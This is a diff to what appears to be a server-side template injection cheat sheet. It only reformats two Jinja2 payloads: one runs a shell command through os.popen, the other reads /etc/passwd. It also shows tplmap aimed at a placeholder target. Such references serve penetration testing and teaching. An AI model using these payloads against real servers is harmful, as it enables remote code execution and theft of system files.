@@ -57,7 +57,7 @@ tplmap -u "http://<target>"
 
 ```python
 # Python reverse shell via Jinja2 SSTI
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
 ```
 
 ### RCE via EJS (Node.js/Express)
@@ -72,7 +72,7 @@ tplmap -u "http://<target>"
 
 ```python
 # Jinja2 — read arbitrary files
-{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
+{{config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read()}}
 ```
 
 ### EJS LFR (Node.js/Express)
